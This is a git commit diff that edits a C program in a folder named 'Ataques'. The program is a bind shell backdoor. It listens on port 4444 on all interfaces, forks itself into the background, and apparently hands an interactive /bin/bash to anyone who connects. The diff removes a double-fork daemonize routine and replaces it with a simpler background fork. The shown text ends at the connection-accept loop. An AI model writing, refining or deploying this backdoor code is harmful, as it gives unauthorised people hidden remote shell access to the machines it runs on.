5cd26a63716155d83592db0593a247d7af886bba
NiPeGun <nipegun@gmail.com>
2025-02-09 02:27:15 +0100

    Update and rename BashReversoANetCat2.c to BashReversoANetCat3.c

--- Ataques/BashReversoANetCat3.c
+++ Ataques/BashReversoANetCat3.c
@@ -12,37 +12,12 @@
 #include <signal.h>
 #include <string.h>
 
-void daemonize() {
-    pid_t pid = fork();
-    if (pid < 0) exit(1);
-    if (pid > 0) exit(0);
-
-    if (setsid() < 0) exit(1);
-    signal(SIGHUP, SIG_IGN);
-
-    pid = fork();
-    if (pid < 0) exit(1);
-    if (pid > 0) exit(0);
-
-    int fd = open("/dev/null", O_RDWR);
-    if (fd >= 0) {
-        dup2(fd, STDIN_FILENO);
-        dup2(fd, STDOUT_FILENO);
-        dup2(fd, STDERR_FILENO);
-        close(fd);
-    }
-
-    chdir("/");
-    umask(0);
-}
-
 int main() {
-    daemonize();
-
     int sockfd, clientfd;
     struct sockaddr_in server_addr;
-    char *bash_shell[] = {"/bin/bash", "-i", NULL};  // Ejecutar bash en modo interactivo
+    char *bash_shell[] = {"/bin/bash", "-i", NULL};
 
+    // Crear un socket
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) exit(1);
 
@@ -50,8 +25,15 @@ int main() {
     server_addr.sin_addr.s_addr = INADDR_ANY;
     server_addr.sin_port = htons(4444);
 
+    // Enlazar el socket al puerto
     if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) exit(1);
     if (listen(sockfd, 1) < 0) exit(1);
+
+    // **Fork para mantener el proceso en segundo plano**
+    if (fork() != 0) {
+        close(sockfd);
+        exit(0); // Cierra el proceso padre
+    }
 
     while (1) {
         clientfd = accept(sockfd, NULL, NULL);
